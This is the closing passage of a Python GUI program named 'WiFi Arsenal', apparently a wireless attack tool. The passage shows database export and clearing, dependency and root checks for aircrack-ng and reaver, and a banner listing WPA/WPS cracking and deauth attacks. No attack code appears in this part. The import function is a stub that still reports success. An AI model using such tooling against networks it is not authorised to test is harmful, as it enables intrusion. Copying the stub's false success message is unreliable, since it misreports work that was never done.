        self.db_info_text.insert(1.0, db_info)
    
    def export_database(self):
        """Export database to JSON file"""
        filename = filedialog.asksaveasfilename(
            title="Export Database",
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                networks = self.db.get_all_networks()
                attacks = self.db.get_attack_history()
                
                export_data = {
                    'export_timestamp': datetime.now().isoformat(),
                    'networks': networks,
                    'attacks': attacks
                }
                
                with open(filename, 'w') as f:
                    json.dump(export_data, f, indent=2, default=str)
                
                messagebox.showinfo("Export Successful", f"Database exported to {filename}")
            except Exception as e:
                messagebox.showerror("Export Failed", f"Failed to export database: {str(e)}")
    
    def import_database(self):
        """Import database from JSON file"""
        filename = filedialog.askopenfilename(
            title="Import Database",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'r') as f:
                    import_data = json.load(f)
                
                # Here you would implement the import logic
                messagebox.showinfo("Import Successful", f"Database imported from {filename}")
                self.update_database_info()
            except Exception as e:
                messagebox.showerror("Import Failed", f"Failed to import database: {str(e)}")
    
    def clear_database(self):
        """Clear all database records"""
        if messagebox.askyesno("Clear Database", "Are you sure you want to clear all database records? This action cannot be undone."):
            try:
                conn = sqlite3.connect(self.db.db_path)
                cursor = conn.cursor()
                
                cursor.execute('DELETE FROM networks')
                cursor.execute('DELETE FROM clients')
                cursor.execute('DELETE FROM attacks')
                cursor.execute('DELETE FROM handshakes')
                
                conn.commit()
                conn.close()
                
                messagebox.showinfo("Database Cleared", "All database records have been cleared.")
                self.update_database_info()
                self.refresh_results()
            except Exception as e:
                messagebox.showerror("Clear Failed", f"Failed to clear database: {str(e)}")
    
    def update_status(self, message):
        """Update status bar"""
        self.status_text.configure(text=message)
    
    def on_closing(self):
        """Handle application closing"""
        if self.scanning and self.scanner:
            self.scanner.stop_scan()
        
        if self.monitor_interface:
            ArsenalNetworkInterface.disable_monitor_mode(self.monitor_interface)
        
        self.root.destroy()
    
    def run(self):
        """Start the application"""
        # Center window
        self.root.update_idletasks()
        x = (self.root.winfo_screenwidth() // 2) - (self.root.winfo_width() // 2)
        y = (self.root.winfo_screenheight() // 2) - (self.root.winfo_height() // 2)
        self.root.geometry(f"+{x}+{y}")
        
        # Show startup message
        self.update_status("🚀 WiFi Arsenal initialized - Ready for security auditing")
        
        # Start main loop
        self.root.mainloop()

def check_dependencies():
    """Check for required tools and dependencies"""
    required_tools = [
        'airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng', 'reaver', 'iwconfig'
    ]
    
    missing_tools = []
    
    for tool in required_tools:
        try:
            subprocess.run(['which', tool], capture_output=True, check=True, timeout=5)
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
            missing_tools.append(tool)
    
    if missing_tools:
        raise Exception(f"Missing required tools: {', '.join(missing_tools)}\n"
                       f"Install with: sudo apt-get install aircrack-ng reaver")
    
    return True

def check_permissions():
    """Check if running with proper permissions"""
    if os.geteuid() != 0:
        raise Exception("WiFi Arsenal requires root privileges to access monitor mode and perform attacks")
    
    return True

def display_banner():
    """Display ASCII banner"""
    banner = """
██╗    ██╗██╗███████╗██╗     ██████╗ ██████╗ ███████╗███████╗███╗   ██╗ █████╗ ██╗     
██║    ██║██║██╔════╝██║    ██╔══██╗██╔══██╗██╔════╝██╔════╝████╗  ██║██╔══██╗██║     
██║ █╗ ██║██║█████╗  ██║    ███████║██████╔╝███████╗█████╗  ██╔██╗ ██║███████║██║     
██║███╗██║██║██╔══╝  ██║    ██╔══██║██╔══██╗╚════██║██╔══╝  ██║╚██╗██║██╔══██║██║     
╚███╔███╔╝██║██║     ██║    ██║  ██║██║  ██║███████║███████╗██║ ╚████║██║  ██║███████╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝

╔══════════════════════════════════════════════════════════════════════════════════════╗
║                    Advanced WiFi Security Auditing Platform                         ║
║                                Developed by 0x0806                                  ║
║                                                                                      ║
║  🎯 Features: Advanced Scanning | Multi-Attack Vectors | Real-time Analytics       ║
║  ⚔️  Attacks: WEP/WPA/WPS | Deauth | Dictionary | Advanced Vulnerability Analysis  ║
║  📊 Analytics: Vulnerability Scoring | Attack Statistics | Network Mapping         ║
║                                                                                      ║
║  ⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY                          ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
"""
    print(banner)

def main():
    """Main function"""
    display_banner()
    
    print("🔍 Checking system requirements...")
    
    try:
        # Check dependencies
        check_dependencies()
        print("✅ All required tools found")
        
        # Check permissions
        check_permissions()
        print("✅ Running with proper privileges")
        
    except Exception as e:
        print(f"❌ System check failed: {e}")
        sys.exit(1)
    
    print("🚀 Launching WiFi Arsenal...")
    
    try:
        # Create and run application
        app = WiFiArsenal()
        app.run()
    except KeyboardInterrupt:
        print("\n🛑 WiFi Arsenal terminated by user")
    except Exception as e:
        print(f"💥 Fatal error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("👋 WiFi Arsenal shutdown complete")

if __name__ == "__main__":
    main()
